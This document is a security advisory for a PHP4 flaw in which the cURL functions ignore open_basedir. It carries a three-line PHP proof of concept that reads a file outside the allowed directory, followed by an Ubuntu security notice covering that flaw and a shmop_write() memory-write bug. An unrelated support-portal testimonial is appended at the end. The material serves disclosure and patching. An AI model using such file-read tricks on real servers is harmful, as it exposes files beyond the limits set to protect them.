====================================================
Subject: PHP4 cURL functions bypass open_basedir
Author: frame at kernelpanik.org
Product: PHP4 compile with cURL (not tested in PHP5)
Vendor: PHP/Zend
Vendor URL: [www.php.net](http://www.php.net)
Tipe: Local
Risk: Low/Medium
=====================================================

PHP cURL functions bypass open_basedir
protection, so users can navigate through
filesystem.

For example, setting "open_basedir" in php.ini to
"/var/www/html" anybody can retrieve "/etc/parla"
using cURL functions.

== Proof of concept (curl.php)
<?php
$ch = curl_init("file:///etc/parla");
$file=curl_exec($ch);
echo $file
?>

== Demo
$ cat /etc/parla
don't read please!

$ links -dump <http://localhost/curltest/curl.php>
don't read please!

== Release Timeline

Ubuntu Security Notice USN-66-1		   January 20, 2005
php4 vulnerabilities
<http://www.securitytracker.com/alerts/2004/Oct/1011984.html>
<http://www.securityfocus.com/archive/1/384920>
===========================================================

A security issue affects the following Ubuntu releases:

Ubuntu 4.10 (Warty Warthog)

The following packages are affected:

libapache2-mod-php4
php4-cgi
php4-curl

The problem can be corrected by upgrading the affected package to
version 4:4.3.8-3ubuntu7.3. In general, a standard system upgrade is
sufficient to effect the necessary changes.

Details follow:

FraMe from kernelpanik.org reported that the cURL module does not
respect open_basedir restrictions. As a result, scripts which used
cURL to open files with an user-specified path could read arbitrary
local files outside of the open_basedir directory.

Stefano Di Paola discovered a vulnerability in PHP's shmop_write()
function. Its "offset" parameter was not checked for negative values,
which allowed an attacker to write arbitrary data to arbitrary memory
locations. A script which passed unchecked parameters to
shmop_write() could possibly be exploited to execute arbitrary code
with the privileges of the web server and to bypass safe mode
restrictions.

> I like the fact that they really dig into things and then provide answers. As the single Linux guy, I kind of need that second admin next to me sometimes to say, "Hey, what about this?" and I am able to do that through the portal. I get my questions answered and trouble tickets resolved.
